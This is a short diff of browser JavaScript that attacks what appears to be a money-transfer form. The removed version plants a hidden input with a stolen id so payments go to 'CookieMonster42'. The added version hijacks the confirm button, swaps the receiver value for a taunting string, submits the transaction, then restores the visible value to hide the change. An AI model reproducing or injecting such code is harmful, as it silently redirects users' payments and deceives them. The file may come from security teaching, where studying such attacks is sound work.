@@ -1,11 +1,10 @@
-let realReceiverInput = document.getElementById('receiverInput')
-let hiddenReceiverInput = document.createElement('input');
+document.getElementById('confirmButton').onclick = injectMaliciousCode
 
-hiddenReceiverInput.type = 'hidden'; 
-hiddenReceiverInput.id = realReceiverInput.id
-realReceiverInput.id += 'real'
-hiddenReceiverInput.value = 'CookieMonster42'; 
-
-document.querySelector('.form-container').appendChild(hiddenReceiverInput);
-
-
+function injectMaliciousCode() {
+  let originalReceiverInput = document.getElementById('receiverInput');
+  let originalValue = originalReceiverInput.value;
+  originalReceiverInput.value = 'THANKS FOR YO MONEY BITCH';
+  
+  submitTransaction();
+  originalReceiverInput.value = originalValue;
+}
